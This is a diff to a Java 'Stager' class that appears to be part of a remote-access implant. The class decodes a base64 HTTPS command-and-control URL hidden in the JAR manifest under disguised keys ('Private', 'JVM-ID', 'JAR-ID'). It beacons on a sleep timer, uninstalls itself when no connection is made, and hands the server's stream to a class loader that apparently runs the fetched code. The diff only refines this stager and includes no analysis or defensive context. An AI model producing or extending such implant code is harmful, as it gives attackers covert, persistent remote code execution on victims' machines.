@@ -72,7 +72,9 @@ public class Stager extends ClassLoader {
     final protected static char[] hexArray = "0123456789ABCDEF".toCharArray();
     public static String serviceName = ""; 
     public static final SimpleDateFormat CHECKIN_DATE_FORMAT = new SimpleDateFormat("MM/dd/yyyy--HH:mm");
-    public static final String DEATH_LABEL ="X";
+    public static final String DEATH_LABEL ="JAR-ID";
+    public static final String SLEEP_LABEL = "JVM-ID";
+    public static final String URL = "Private";
     public static final String STAG_PROP_FILE ="META-INF/MANIFEST.MF";
     
     /**
@@ -95,23 +97,19 @@ public class Stager extends ClassLoader {
             localProperties.load(localInputStream);
             localInputStream.close();
 
-            InputStream theIS = null;
-            OutputStream theOS = null;
-            String decodedURL = null;
-
-            byte[] clientId = null;
-            String theURL = localProperties.getProperty("U", null);
+            //Get the URL
+            String theURL = localProperties.getProperty(URL, null);
             if (theURL != null){
 
                 sun.misc.BASE64Decoder aDecoder = new sun.misc.BASE64Decoder();
-                decodedURL = new String( aDecoder.decodeBuffer(theURL) ).trim();
+                String decodedURL = new String( aDecoder.decodeBuffer(theURL) ).trim();
                 if ( decodedURL.startsWith("https:")) {
 
                     //Create sleep timer
                     SleepTimer aTimer = new SleepTimer(decodedURL);
 
                     //Get sleep time if it exists
-                    String sleepTime = localProperties.getProperty("Z", null);
+                    String sleepTime = localProperties.getProperty(SLEEP_LABEL, null);
                     if (sleepTime != null){
 
                         //Start the timer
@@ -145,26 +143,22 @@ public class Stager extends ClassLoader {
                     if( theConnection != null ){
 
                         //Get the input stream
-                        theIS = aTimer.getInputStream();
-                        clientId = aTimer.getClientId();
+                        InputStream theIS = aTimer.getInputStream();
+                        byte[] clientId = aTimer.getClientId();
+                        
+                        OutputStream theOS = new ByteArrayOutputStream();
+                
+                        Stager theStager = new Stager();
+                        theStager.start(theIS, theOS, decodedURL, clientId );
 
                     } else {
                         uninstall();
-                        return;
                     }
 
-                } else {
-                    return;
-                }
+                } 
 
-                theOS = new ByteArrayOutputStream();
+            } 
 
-            } else {
-                return;
-            }
-
-            Stager theStager = new Stager();
-            theStager.start(theIS, theOS, decodedURL, clientId );
         }
 
     }
